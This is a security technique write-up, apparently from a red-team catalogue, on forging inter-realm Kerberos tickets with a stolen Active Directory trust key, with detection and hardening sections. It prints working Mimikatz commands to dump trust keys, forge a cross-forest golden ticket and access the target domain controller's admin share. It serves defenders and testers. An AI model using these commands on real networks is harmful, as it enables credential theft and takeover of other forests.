# [CA-KERB-013]: Krbtgt Cross-Forest Reuse

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-013 |
| **MITRE ATT&CK v18.1** | [Steal or Forge Kerberos Tickets (T1558)](https://attack.mitre.org/techniques/T1558/) |
| **Tactic** | Credential Access / Persistence |
| **Platforms** | Windows AD |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** In a multi-forest environment, trusts are secured by a Trust Key (Inter-Realm Key). If an attacker compromises the Trust Key (which acts like a `krbtgt` for the trust), they can forge Inter-Realm TGTs. This allows them to create referral tickets that the target forest trusts, effectively enabling cross-forest Golden Tickets.
- **Attack Surface:** Trust Objects (TrustedDomain) in AD.
- **Business Impact:** **Cross-Forest Compromise**. Moving from a compromised low-security forest (e.g., Dev) to a high-security forest (e.g., Prod).

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Domain Admin in the *Source* Forest (to dump the Trust Key).
- **Vulnerable Config:** Bi-directional trusts or inbound trusts without SID Filtering.
- **Tools:**
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Dump Trust Key**
On the compromised DC, dump the trust keys (Incoming/Outgoing).
```powershell
lsadump::trust /patch
```

**Step 2: Forge Inter-Realm Ticket**
Create a ticket that looks like it came from the trusted forest.
```powershell
# /domain: The domain we are coming FROM
# /sid: The SID of the domain we are coming FROM
# /target: The domain we are going TO
# /rc4: The Trust Key (RC4)
# /service: krbtgt
kerberos::golden /user:Administrator /domain:source.local /sid:SourceSID /target:target.local /rc4:TrustKey /service:krbtgt /ptt
```

**Step 3: Access Target**
```cmd
dir \\TargetDC.target.local\C$
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security** | 4769 | Service Name = `krbtgt`, Ticket Options = `0x60000000` (Enc-Tkt-In-Skey) indicating cross-realm. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Rotation:** Rotate Trust Passwords periodically (netdom trust).
*   **Selective Auth:** Use **Selective Authentication** instead of Forest-wide authentication for trusts. This forces you to explicitly grant access to specific resources in the target forest.

## 7. ATTACK CHAIN
> **Preceding Technique:** [CA-DUMP-002]
> **Next Logical Step:** [LAT-AD-003]
